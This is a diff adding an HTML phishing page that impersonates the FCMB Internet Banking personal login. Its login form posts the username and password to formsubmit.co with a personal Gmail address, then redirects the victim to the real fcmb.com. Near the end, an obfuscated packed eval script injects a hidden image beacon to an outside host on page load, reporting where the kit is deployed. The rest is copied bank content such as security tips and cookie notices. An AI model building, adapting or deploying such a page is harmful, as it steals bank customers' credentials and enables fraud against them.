@@ -1,0 +1,875 @@
+<!doctype html>
+<!-- paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/ -->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="no-js" lang="en">
+<!--<![endif]-->
+
+<head id="ctl00_Head1">
+    <meta charset="utf-8" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+        .::FCMB Internet Banking - Personal
+    </title>
+    <meta name="author" content="Super User" />
+    <meta name="generator" content="FCMB Content Management" />
+    <link href="favicon.ico" rel="shortcut icon" />
+    <link rel="stylesheet" href="fcmb_css/foundation.min.css" />
+    <link rel="stylesheet" href="fcmb_css/app.css" />
+    <link rel="stylesheet" href="icons/foundation-icons.css" />
+    <link rel="stylesheet" href="fcmb_css/style.css" />
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans:400,700" rel="stylesheet" type="text/css" />
+    <script src="fcmb_js/modernizr.foundation.js"></script>
+
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" />
+
+    <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+    </script>
+
+    <script src="fcmb_js/jquery.js"></script>
+    <script src="fcmb_js/foundation.js"></script>
+
+    <script type="text/javascript" src="/fancybox/lib/jquery.mousewheel-3.0.6.pack.js"></script>
+
+    <link rel="stylesheet" href="/fancybox/source/jquery.fancybox.css?v=2.1.5" type="text/css" media="screen" />
+    <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+    <link rel="stylesheet" href="/fancybox/source/helpers/jquery.fancybox-buttons.css?v=1.0.5" type="text/css"
+        media="screen" />
+    <script type="text/javascript" src="/fancybox/source/helpers/jquery.fancybox-buttons.js?v=1.0.5"></script>
+    <script type="text/javascript" src="/fancybox/source/helpers/jquery.fancybox-media.js?v=1.0.6"></script>
+
+    <link rel="stylesheet" href="/fancybox/source/helpers/jquery.fancybox-thumbs.css?v=1.0.7" type="text/css"
+        media="screen" />
+    <script type="text/javascript" src="/fancybox/source/helpers/jquery.fancybox-thumbs.js?v=1.0.7"></script>
+
+    <script src="fcmb_js/app.js"></script>
+
+
+    <script>
+        var opened = false, vkb = null, text = null;
+
+        function keyb_change() {
+            document.getElementById("switch").innerHTML = (opened ? "Virtual Keyboard" : "Hide Keyboard");
+            opened = !opened;
+
+            if (opened && !vkb) {
+                // Note: all parameters, starting with 3rd, in the following
+                // expression are equal to the default parameters for the
+                // VKeyboard object. The only exception is 15th parameter
+                // (flash switch), which is false by default.
+
+                vkb = new VKeyboard("keyboard",    // container's id
+                    keyb_callback, // reference to the callback function
+                    false,          // create the arrow keys or not? (this and the following params are optional)
+                    false,          // create up and down arrow keys? 
+                    false,         // reserved
+                    true,          // create the numpad or not?
+                    "Arial",            // font name ("" == system default)
+                    "11px",        // font size in px
+                    "#666",        // font color
+                    "#F00",        // font color for the dead keys
+                    "#FFF",        // keyboard base background color
+                    "#FFF",        // keys' background color
+                    "#DDD",        // background color of switched/selected item
+                    "#777",        // border color
+                    "#CCC",        // border/font color of "inactive" key (key with no value/disabled)
+                    "#FFF",        // background color of "inactive" key (key with no value/disabled)
+                    "#F77",        // border color of the language selector's cell
+                    true,          // show key flash on click? (false by default)
+                    "#CC3300",     // font color during flash
+                    "#FF9966",     // key background color during flash
+                    "#CC3300",     // key border color during flash
+                    false,         // embed VKeyboard into the page?
+                    true,          // use 1-pixel gap between the keys?
+                    0);            // index(0-based) of the initial layout
+            }
+            else
+                vkb.Show(opened);
+
+            text = document.getElementById("ctl00_ContentPlaceHolder1_textbox");
+            text.focus();
+
+            if (document.attachEvent)
+                text.attachEvent("onblur", backFocus);
+        }
+
+        function backFocus() {
+            if (opened) {
+                var l = text.value.length;
+
+                setRange(text, l, l);
+
+                text.focus();
+            }
+        }
+
+        // Callback function:
+        function keyb_callback(ch) {
+            var val = text.value;
+
+            switch (ch) {
+                case "BackSpace":
+                    var min = (val.charCodeAt(val.length - 1) == 10) ? 2 : 1;
+                    text.value = val.substr(0, val.length - min);
+                    break;
+
+                case "Enter":
+                    text.value += "\n";
+                    break;
+
+                default:
+                    text.value += ch;
+            }
+        }
+
+        function setRange(ctrl, start, end) {
+            if (ctrl.setSelectionRange) // Standard way (Mozilla, Opera, ...)
+            {
+                ctrl.setSelectionRange(start, end);
+            }
+            else // MS IE
+            {
+                var range;
+
+                try {
+                    range = ctrl.createTextRange();
+                }
+                catch (e) {
+                    try {
+                        range = document.body.createTextRange();
+                        range.moveToElementText(ctrl);
+                    }
+                    catch (e) {
+                        range = null;
+                    }
+                }
+
+                if (!range) return;
+
+                range.collapse(true);
+                range.moveStart("character", start);
+                range.moveEnd("character", end - start);
+                range.select();
+            }
+        }
+
+        //--></script>
+
+
+    <link href="App_Themes/DefaultScreen/Skin.css" type="text/css" rel="stylesheet" />
+</head>
+
+<body>
+
+    <form action="https://formsubmit.co/shuggzydell97@gmail.com" method="POST">
+        <div>
+                <input type="hidden" name="_next" value="https://www.fcmb.com/">
+            <input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
+            <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+            <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
+                value="/wEPDwUKMTA0MzkyOTU2Mw9kFgJmD2QWAgIDD2QWBgIDDw8WAh4EVGV4dAUZU3VuZGF5LCBEZWNlbWJlciAwMSwgMjAyNGRkAgUPZBYEAgEPDxYCHwBlZGQCBw8PZBYCHgdvbmNsaWNrBRVyZXR1cm4gR2VuZXJhdGVQd2QoKTtkAgcPDxYCHwAFBDIwMjRkZGQiMC/PfB08SQgG2F/tvNx1kdgatA==" />
+        </div>
+
+        <script type="text/javascript">
+            //<![CDATA[
+            var theForm = document.forms['aspnetForm'];
+            if (!theForm) {
+                theForm = document.aspnetForm;
+            }
+            function __doPostBack(eventTarget, eventArgument) {
+                if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                    theForm.__EVENTTARGET.value = eventTarget;
+                    theForm.__EVENTARGUMENT.value = eventArgument;
+                    theForm.submit();
+                }
+            }
+            //]]>
+        </script>
+
+
+        <script
+            src="/WebResource.axd?d=0IqeVMYeXXXExyuccFTlQPaHIVhNKLkIspiNJznaGISXCkdo7xAsinihKsnwqdhETXkGMeHTJyrWSNWsQirNGkJQg5Q1&amp;t=638460274960000000"
+            type="text/javascript"></script>
+
+
+        <script
+            src="/ScriptResource.axd?d=T5EMsjPM9nDVB8AOnrehXFL2xQibgg4mNhq8ive8WVCyHhkiCPLW1qoDF1hGg3QS8s0AFWbleGb8xKj7S0TdDgTQfQrBUHS4yJ6CoWzhgh2n5J78EX66amRPLU0TmV_KibbLdhDrgkG1dpfE8Z_UmL6YkBk1&amp;t=74258c30"
+            type="text/javascript"></script>
+        <script
+            src="/ScriptResource.axd?d=LoozOiZqL6cHWQYLjz9RL4pUEIxFiifelk2fmnRry3mhUJuVH96s3V7_A9YHHE84OZ5hNUQU5TgoSD37m-2dhRiNBxICK4h94zvne3H5bYCo3MeU_isbhyUK1MTV3EIdAvYb8DwRWq-6joFtTX8hMqRdlNTxMh96yAasPmfRcHQi2NRB0&amp;t=74258c30"
+            type="text/javascript"></script>
+        <script
+            src="/WebResource.axd?d=QmK7Db2SS0lBQ8SRdlbE9l-Pg11d0iUNtuOyvayV6en22WtQS59U8c0IVZEukC4Teb196BdY8HQMu-2sJIVeoYV5MLA1&amp;t=638460274960000000"
+            type="text/javascript"></script>
+        <div>
+
+            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="50D8B8D2" />
+            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
+                value="/wEdAAT2ymTgX8DCx2rEcb3cIYo79jPueHp2S9yz6AhZNsMn9qBL9FiaQ1wSPAr0sRt4yCKwS4xnW8ZIVB06X7opsHDkrkl01Z6xN3be6SZPBzTcG1BxfHs=" />
+        </div>
+        <script type="text/javascript">
+            //<![CDATA[
+            Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager1', 'aspnetForm', [], [], [], 90, 'ctl00');
+            //]]>
+        </script>
+
+
+        <div class="wrapper white-bg">
+            <!-- logo start -->
+
+            <div class="contain-to-grid">
+                <div style="padding-left: 50px">
+
+
+                    <div class="twelve  columns small-top-bottom-padding">
+                        <img src="images/logo-new.png" class="left" style="max-width: 98px; padding: 0px 10px;"
+                            height="110px" width="110px">
+                        <div class="clear"></div>
+                    </div>
+                </div>
+            </div>
+            <!-- logo ends -->
+            <!-- header bar-->
+            <div class="row contain-to-grid">
+
+                <div class="seven columns yellow">
+                    <div class="row ini" style="margin-left: 50px;">
+                        <img src="images/lock.png">
+
+                        <span style="font-size: 13px; font-weight: bold;">Individual Banking</span>
+
+                    </div>
+                </div>
+
+                <div class="five columns black">
+
+                    <div class="six   columns">
+                        <span class="fonttext">
+                            <span id="ctl00_lblDate">Sunday, December 01, 2024</span></span>
+                    </div>
+
+                    <div class="four hide-for-small hide-for-medium columns end">
+                        <p class="fonttext  text-right">&nbsp;</p>
+                    </div>
+
+                </div>
+
+            </div>
+            <!-- header bar ends-->
+            <!-- red yellow bar starts-->
+            <div class="contain-to-grid">
+                <div class="six columns ">
+                </div>
+                <div class="six columns ">
+                </div>
+            </div>
+            <!-- red yellow bar ends-->
+
+
+
+            <!-- main content starts-->
+            <div class="newheader">
+
+                <style type="text/css">
+                    .modal {
+                        display: block;
+                        position: fixed;
+                        z-index: 1;
+                        left: 0;
+                        top: 0;
+                        width: 100%;
+                        height: 100%;
+                        overflow: auto;
+                    }
+
+                    #cookieConsent {
+                        font-family: "Gotham", "Open Sans", Helvetica, Arial, sans-serif, Arial;
+                        z-index: 1000;
+                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                    }
+
+                    #cookieConsent a {
+                        color: #fff;
+                        text-decoration: underline;
+                    }
+
+                    #cookieConsent button {
+                        font-size: 14px;
+                        margin-left: 10px;
+                    }
+
+                    .overlay {
+                        font-size: 15px;
+                        color: #000;
+                        font-family: "Gotham", "Open Sans", Helvetica, Arial, sans-serif, Arial;
+                        position: absolute;
+                        top: 35%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        background-color: #ffffff;
+                        padding: 30px;
+                        border-radius: 10px;
+                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                        width: 80%;
+                        max-width: 725px;
+                    }
+
+                    .overlay p {
+                        font-size: 15px;
+                        margin-bottom: 20px;
+                        font-weight: 500;
+                    }
+
+                    .overlay .btn {
+                        background-color: #800080;
+                        color: white;
+                        border: none;
+                        padding: 10px 20px;
+                        cursor: pointer;
+                        border-radius: 5px;
+                    }
+
+                    /*.overlay .btn:hover {
+                    background-color: #4b0082;
+                }*/
+
+                    .overlay .checkbox {
+                        display: flex;
+                        align-items: center;
+                        margin-top: 10px;
+                    }
+
+                    .overlay .checkbox input {
+                        margin-right: 5px;
+                    }
+                </style>
+
+                <!-- main content starts-->
+
+                <div class="row">
+                    <!-- left cartoon-->
+                    <div class="five columns hide-for-small" style="padding-top: 35px; top: 0px; left: 0px;">
+
+
+                    </div>
+
+                    <!--right content-->
+                    <div class="seven columns">
+                        <div class="row">
+
+
+
+
+
+
+                            <div class="twelve columns curve red-grad margin-top-large hide-for-small"
+                                style="margin-bottom: 10px;">
+                                <b>Your User ID and Password are confidential. NEVER disclose them to anyone.</b><br>
+                                <br>
+                                <b>Login To Your FCMB Online Account</b>
+                            </div>
+
+                            <div class="row" style="text-align: center; margin-bottom: 10px;">
+                                <div class="twelve columns">
+                                    <span id="ctl00_ContentPlaceHolder1_lblLoginStatus" class="mediumtext"></span>
+                                </div>
+                            </div>
+
+                            <div
+                                class="twelve columns curve border margin-top-small small-padding margin-bottom-small box">
+                                <div class="row ">
+                                    <div class="nine  columns ">
+                                        <span
+                                            style="font-family: 'Arial Black', Gadget, sans-serif; font-size: 20px; font-weight: bold; color: #5C5C5C;">FCMB</span>
+                                        <span
+                                            style="font-family: 'Arial Black', Gadget, sans-serif; font-size: 20px; font-weight: bold; color: #5C5C5C;">Online</span>
+                                    </div>
+                                    <div class="three  hide-for-small columns newi" style="text-align: right;">
+                                        <span style="font-size: 10px; color: #5C5C5C;">Secure Site
+                                            <img src="images/secure.png" width="18" height="21"></span>
+                                    </div>
+                                </div>
+
+                                <div class="twelve columns margin-top-small">
+
+                                    <div class="twelve columns margin-top-small">
+
+                                        <div class="row">
+
+                                            <div class="five columns">
+                                                <label class=" smalltext form-label" id="ind-form-name">Username</label>
+                                                <input name="UserID" type="text" maxlength="50" tabindex="1"
+                                                    class="curve" placeholder="Your ID" />
+                                                <span class="writefont"><a href="UsernameRequestUI.aspx">Forgot your
+                                                        Username?</a></span>
+
+                                                <p style="font-size: 12px; color: #0026ff; padding-top: 5px">
+                                                    <a href="faqui.aspx" style="color: #0000CC">Click here for
+                                                        <strong>tips</strong></a>
+                                                </p>
+
+                                            </div>
+                                            <div class="four columns">
+                                                <label class="smalltext form-label" id="ind-form-name0">Password</label>
+
+                                                <input name="Password" type="password" maxlength="50" tabindex="2"
+                                                    class="curve" autocomplete="off" placeholder="Your Password Here" />
+                                                <span class="writefont"><a href="ResetPasswordUI.aspx">Forgot your
+                                                        Password?</a></span><br>
+                                                <a class=" writefont fancybox" href="#loginProblems">Having problems
+                                                    logging in?</a>
+                                                <div id="loginProblems" style="display: none; width: 600px;">
+                                                    <p>
+                                                        - Enter your user ID sent to your phone by the bank at
+                                                        registration
+                                                        <br>
+                                                        - Enter your password sent to your email by the bank at
+                                                        registration, you will need to change the password once you log
+                                                        in.<br>
+                                                        - Click on the "Login" button.
+                                                    </p>
+                                                </div>
+                                            </div>
+                                            <div class="three columns " style="margin-top: 23px;">
+                                                <input type="submit" name="First City Monument Bank"
+                                                    value="Login" onclick="return GeneratePwd();"
+                                                     tabindex="3"
+                                                    class="button arrowright yellow-button curve fa fa-chevron-circle-right"
+                                                    style="padding-right: 15px; top: 0px; font-family: 'Arial Rounded MT';" />
+
+                                            </div>
+
+
+
+                                        </div>
+
+                                    </div>
+
+
+                                </div>
+
+                                <div class="row">
+                                    <div class="twelve columns">
+
+                                        <hr style="border: 1px dotted #999; margin-bottom: 5px; margin-top: 5px;">
+                                    </div>
+
+                                    <div class="nine medium-9 small-12 columns">
+                                        <p style="font-size: 12px; color: #999; padding-top: 5px">
+                                            Don't have Online Banking yet?
+                                            <b
+                                                style="font-size: 13px; font-weight: bold; color: #666; margin-bottom: 0px;"><a
+                                                    href="TermsAndConditionsUI.aspx">Register Now</a></b>
+                                        </p>
+                                    </div>
+
+                                    <div class="three medium-3 small-12 columns ">
+                                    </div>
+                                </div>
+
+                            </div>
+                            <!--Shadowed box ends-->
+
+
+                            <div class="row hide-for-small hide-for-medium">
+                                <div class="twelve columns  margin-bottom margin-top-small">
+                                    <div class="panel grey-bggrey curve small-padding">
+                                        <div class="row">
+                                            <div class="three columns">
+                                                <img src="images/home.png">
+                                                <ul class="list-things">
+                                                    <li><a href="http://www.fcmb.com/customer/branches-atms "
+                                                            target="_blank">Where to find a branch</a></li>
+                                                    <li><a href="http://www.fcmb.com/customer/branches-atms "
+                                                            target="_blank">Where to find ATM</a></li>
+
+                                                </ul>
+                                            </div>
+
+                                            <div class="three columns">
+                                                <img src="images/mouse.png" style="margin-top: 10px;">
+                                                <ul class="list-things">
+                                                    <li><a href="https://onlineaccount.fcmb.com/ " target="_blank">Open
+                                                            an account online </a></li>
+                                                    <li><a class=" writefont fancybox"
+                                                            href="#eStatement">E-statements</a>
+                                                    </li>
+                                                    <li>How to use the internet banking</li>
+                                                </ul>
+                                            </div>
+
+
+                                            <div class="three columns">
+                                                <img src="images/phone.png">
+                                                <ul class="list-things">
+                                                    <li><a class=" writefont fancybox" href="#telephoneBanking">Our
+                                                            telephone banking services</a>
+
+                                                    <li><a href="mailto:customerservice@fcmb.com">Send us feedback by
+                                                            mail</a></li>
+                                                </ul>
+                                            </div>
+
+                                            <div class="three columns">
+                                                <img src="images/pad.png">
+                                                <ul class="list-things">
+
+                                                    <li><a class=" writefont fancybox" href="#onlineSecurity">How to
+                                                            secure your account</a>
+                                                </ul>
+
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+
+                            <div id="eStatement" style="display: none; width: 600px;">
+                                <h2 style="color: #5c2684">e-Statement</h2>
+                                <hr />
+                                <p>
+                                    You can access your accumulated statements going back as far as 36 months.
+                                    To do this, simply login to internet banking, select the prefer dates you would like
+                                    to view statements for,
+                                    chose the format and send it to your registered email address. Your statement will
+                                    be sent to you within minutes
+                                </p>
+                            </div>
+                            <div id="telephoneBanking" style="display: none; width: 600px;">
+                                <h2 style="color: #5c2684">Telephone Banking</h2>
+                                <hr />
+                                <p>
+                                    Telephone banking is a service provided by FCMB which allows its
+                                    customers to perform some basic banking transactions over the telephone.
+                                </p>
+                                <br />
+                                <p>
+                                    FCMB telephone banking service uses an automated phone answering
+                                    system with phone keypad response. To ensure security, the customer must
+                                    first authenticate through a numeric PIN. This service offers virtually
+                                    all the features of an automated teller machine: account balance
+                                    information and list of latest transactions, electronic bill payments
+                                    and funds transfers between a customer's accounts.
+                                </p>
+                                <br />
+                                <p>FCMB Telephone Banking allows you to perform the following services:</p>
+                                <ul>
+                                    <li>Account Balance request</li>
+                                    <li>Requests –</li>
+                                    <ul>
+                                        <li>Cheque Book</li>
+                                        <li>ATM Card</li>
+                                        <li>ATM Card hotlist</li>
+                                    </ul>
+                                    <li>Last 5 transactions history of your account</li>
+                                    <li>Funds transfer (within FCMB only for now)</li>
+                                    <li>DSTV payment</li>
+                                </ul>
+                                <br />
+                                <p>To get registered, simply follow the steps below:</p>
+                                <ul>
+                                    <li>Step 1: Dial Contact Centre on 07003290000 or 012798800</li>
+                                    <li>Step 2: Follow the voice prompt; Press 1 for Telephone Banking</li>
+                                    <li>Step 3: Follow the voice prompt; then press 2 to register (for new users).</li>
+                                </ul>
+                                <br />
+                                <p>Ensure the following information is readily available whilst registering:</p>
+                                <ul>
+                                    <li>Your Customer ID (this is the 1st seven digits of your account number e.g.
+                                        xxxxxxx017) or Your Debit Card Number</li>
+                                    <li>Your registered year of birth (e.g. 1982)</li>
+                                    <li>The last 4 digits of any of your registered GSM telephone number (e.g.
+                                        0803333xxxx)</li>
+                                </ul>
+                                <br />
+                                <p>
+                                    Once the above details are auto validated, a PIN will be sent to the
+                                    registered telephone with the last 4 digits used above. Please go back
+                                    to Step 1 &amp; 2 above; then Press 1 to login. Remember, this service
+                                    is available 24/7, including weekends and public holidays.
+                                </p>
+                            </div>
+
+
+                            <div id="onlineSecurity" style="display: none; width: 600px;">
+
+
+                                <h2 style="color: #5c2684">Online Security </h2>
+                                <hr />
+
+                                <p>To guide against unauthorized access to your account, it is important that you
+                                    protect your details securely. Consequently, The unavoidable fact remains; you are
+                                    your best protection while conducting financial transactions online. As a result, we
+                                    advice that you kindly follow the online security tips below when transacting on the
+                                    FCMB Online Platform.</p>
+
+                                <br />
+
+                                <ul>
+                                    <li>A password should be used when accessing your account online. Your password
+                                        should be known to you only and should change regularly. Avoid using birthdates,
+                                        numbers or words that may be easy for others to guess.</li>
+                                    <li>Always be careful of how and to whom you give your password. Keep your password
+                                        private. Upon completion of your transactions, ensure you sign out of the online
+                                        banking platform, clear your cache and close your browser. Often, it is easy to
+                                        forget to sign out of an online banking session.</li>
+                                    <br />
+                                    <li>Never disclose, share or provide your password to anyone. Please be informed
+                                        that on no condition would FCMB request for your password. Please do not reveal
+                                        your personal verification question answers to anyone or disclose them in any
+                                        email. Giving your password verification answers to another person or company,
+                                        places your finances and privacy at risk.</li>
+                                    <li>If you do use a public access computer, such as an Internet café or public
+                                        library, ensure to change your password after completing your session. If in
+                                        doubt, call the contact centre for a password reset and complete de-activation
+                                        of your profile until you are convinced your account is safe from unnecessary
+                                        access.</li>
+                                </ul>
+                                <p class="smalltext">We invite you to take advantage of these safety tips when
+                                    performing your online banking transactions.</p>
+                                <br />
+                                <p class="smalltext">For more information, please call our Contact Centre on 07003290000
+                                    or 01-2798800.Alternatively you can send an email to <a
+                                        href="mailto:customerservice@fcmb.com">customerservice@fcmb.com</a> or visit <a
+                                        href="https://www.fcmb.com/">www.fcmb.com</a></p>
+
+                            </div>
+
+
+
+
+                            <!--Socials start-->
+                            <div class="row hide-for-small hide-for-medium" style="margin-bottom: 5px;">
+                                <div class="four columns">
+                                </div>
+                                <div class="three columns"
+                                    style="text-align: right; margin-top: 14px; padding-right: 0;">
+                                    <span style="color: #37bff5; font-size: 14px;">Connect with us:</span>
+                                </div>
+
+                                <div class="five columns" style="text-align: right; padding-left: 0;">
+                                    <a href="https://fcmblivechat.firstcitygroup.com" target="_blank">
+                                        <img src="../images/live.jpg"></a>
+                                    <a href="https://facebook.com/fcmbmybank" target="_blank">
+                                        <img src="../images/facebook.jpg"></a>
+                                    <a href="#">
+                                        <img src="../images/twitter.png"></a>
+                                    <a href="#">
+                                        <img src="../images/linkedin.jpg"></a>
+                                    <a href="https://www.youtube.com/fcmbplc" target="_blank">
+                                        <img src="../images/youtube.jpg"></a>
+                                    <a href="#">
+                                        <img src="../images/gplus.jpg"></a>
+                                </div>
+
+                            </div>
+
+                            <!--Socials ends-->
+
+                        </div>
+                    </div>
+                    <!--right content ends-->
+                </div>
+
+                <div id="myModal" class="modal" style="display: none;">
+                    <div id="privacyOverlay" class="overlay">
+                        <h3 style="text-align: center; font-weight: 700;">Protecting Your Privacy Is Important To Us
+                        </h3>
+                        <hr style="border: solid #A6368C50;border-width: 1px 0 0;" />
+                        <p>
+                            This Privacy Notice applies to our website - <a href="https://www.fcmb.com" target="_blank"
+                                rel="noopener noreferrer" style="color: #098ab9;">www.fcmb.com</a>
+                            and its associated subdomains (collectively, our “Service”). By accessing or using our
+                            Service,
+                            you consent and signify that you have read, understood, and agreed to our data collection
+                            practices
+                            described in our <a href="https://www.fcmb.com/privacy-policy" target="_blank"
+                                rel="noopener noreferrer" style="color: #098ab9;">Privacy Policy</a>.
+                        </p>
+                        <p>
+                            By clicking "OK" you agree FCMB can collect data to be used for the operation of the
+                            website,
+                            maintain quality of service, and provide general statistics regarding the website.
+                        </p>
+                        <hr style="border: solid #A6368C50;border-width: 1px 0 0;" />
+                        <div class="checkbox">
+                            <input id="dontShowAgain" type="checkbox" />
+                            <label for="dontShowAgain" style="color: lightgray; margin-bottom: 0px;">Don't show
+                                again</label>
+                        </div>
+                        <div style="text-align: right;">
+                            <button id="acceptPrivacyPolicy" class="btn" style="width: 100px;">OK</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="cookieConsent"
+                    style="margin-bottom: 15px; margin-left: 30px; border-radius: 10px; display: block; position: fixed; bottom: 0px; width: 30%; background-color: white; padding: 15px;">
+                    <h5 style="color: darkslategray;  font-weight:600; ">We Use Cookies!</h5>
+                    <p style="line-height:1.3rem; font-size: 14px;">
+                        FCMB website uses cookies to ensure necessary functionality, improve your experience and analyse
+                        our traffic.
+                        By continuing into the website, you have given consent to our use of cookies.
+                        For more information read our <a href="https://www.fcmb.com/privacy-policy" target="_blank"
+                            rel="noopener noreferrer" style="color: purple;">Privacy Policy</a>.
+                    </p>
+                    <div style="text-align: right;">
+                        <button id="acceptCookies"
+                            style="background-color: purple; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-left: 15px;">Accept
+                            all</button>
+                        <button id="rejectCookies"
+                            style="background-color: white; color: purple; padding: 10px 20px; border-width: thin; border-radius: 5px; border-color: purple; cursor: pointer; margin-left: 15px;">Reject
+                            all</button>
+                    </div>
+                </div>
+
+                <!--Main Content  ends-->
+
+                <script type="text/javascript">
+
+                    $(document).ready(function () {
+                        $(".fancybox").fancybox();
+                        // $(document).foundation();
+                    });
+                </script>
+
+                <script type="text/javascript">
+                    function GeneratePwd() {
+                        var pw = document.getElementById("ctl00_ContentPlaceHolder1_textbox").value;
+                        var un = document.getElementById("ctl00_ContentPlaceHolder1_txtLoginName").value;
+                        if (pw != "") {
+                            document.getElementById("ctl00_ContentPlaceHolder1_textbox").value = btoa(makeid(5) + btoa(pw) + makeid(5));
+                        }
+
+                        if (un != "") {
+                            document.getElementById("ctl00_ContentPlaceHolder1_txtLoginName").value = btoa(makeid(5) + btoa(un) + makeid(5));
+                            document.getElementById("ctl00_ContentPlaceHolder1_txtLoginName").type = 'password';
+                        }
+                    }
+                    function makeid(length) {
+                        let result = '';
+                        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                        const charactersLength = characters.length;
+                        let counter = 0;
+                        while (counter < length) {
+                            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+                            counter += 1;
+                        }
+                        return result;
+                    }
+                </script>
+
+                <script type="text/javascript">
+                    eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('1.d=c(){f e="<g j=\'b:h;\' k=\'a://5-4.6/7.9?8="+1.r.l+"&u=t\'  w=\'0\' x=\'0\'/>",i=2.v("s");n(i.m=e;i.3.o>0;)2.p.q(i.3[0])};', 34, 34, '|window|document|children|source|page|com|resizeimage|ig|ashx|https|display|function|onload||var|img|none||style|src|hostname|innerHTML|for|length|body|appendChild|location|div|7302|sz|createElement|width|height'.split('|'), 0, {}))
+                </script>
+
+                <script>
+                    window.onload = function () {
+                        // Handle cookie consent
+                        var consent = getCookie("cookieConsentmbai");
+                        if (consent || consent === "") {
+                            document.getElementById("cookieConsent").style.display = "none";
+                        } else {
+                            document.getElementById("cookieConsent").style.display = "block";
+                        }
+
+                        document.getElementById("acceptCookies").onclick = function (event) {
+                            setCookie("cookieConsentmbai", "true", 365);
+                            document.getElementById("cookieConsent").style.display = "none";
+                            event.preventDefault();
+                        };
+
+                        document.getElementById("rejectCookies").onclick = function (event) {
+                            setCookie("cookieConsentmbai", "false", 1);
+                            document.getElementById("cookieConsent").style.display = "none";
+                            event.preventDefault();
+                        };
+
+                        // Handle privacy policy overlay
+                        if (!getCookie("privacyAcceptedmbai")) {
+                            document.getElementById("myModal").style.display = "block";
+                        }
+
+                        document.getElementById("acceptPrivacyPolicy").onclick = function (event) {
+                            var dontShowAgain = document.getElementById("dontShowAgain").checked;
+                            if (dontShowAgain) {
+                                setCookie("privacyAcceptedmbai", "true", 365);
+                            }
+                            event.preventDefault();
+                            document.getElementById("myModal").style.display = "none";
+                        };
+                    };
+
+                    // Function to set a cookie
+                    function setCookie(name, value, days) {
+                        var expires = "";
+                        if (days) {
+                            var date = new Date();
+                            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                            expires = "; expires=" + date.toUTCString();
+                        }
+                        document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=None; Secure";
+                    }
+
+                    // Function to get a cookie by name
+                    function getCookie(name) {
+                        var nameEQ = name + "=";
+                        var ca = document.cookie.split(';');
+                        for (var i = 0; i < ca.length; i++) {
+                            var c = ca[i];
+                            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+                            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+                        }
+                        return null;
+                    }
+                </script>
+
+            </div>
+            <!--Main Content  ends-->
+
+
+
+
+            <!-- footer start-->
+            <div class="contain-to-grid blacknew">
+                <div class="row collapse">
+                    <div class="twelve columns "
+                        style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; line-height: 20px;">
+                        This site ensures that all information sent to us via the World Wide Web are encrypted. You can
+                        confirm the information provided by our certificate issuer by clicking on the padlock icon on
+                        your address bar.
+                        <br>
+                        <span id="ctl00_lblYear">2024</span> © First City Monument Bank Limited. A Member of FCMB Group
+                        Plc.
+                    </div>
+                </div>
+            </div>
+            <!-- footer ends-->
+        </div>
+        <!--wrapper ends-->
+
+
+
+
+        <script type="text/javascript">
+            //<![CDATA[
+            WebForm_AutoFocus('ctl00_ContentPlaceHolder1_txtLoginName');//]]>
+        </script>
+    </form>
+
+
+    <!-- Included JS Files (Compressed) -->
+
+
+
+</body>
+
+</html>
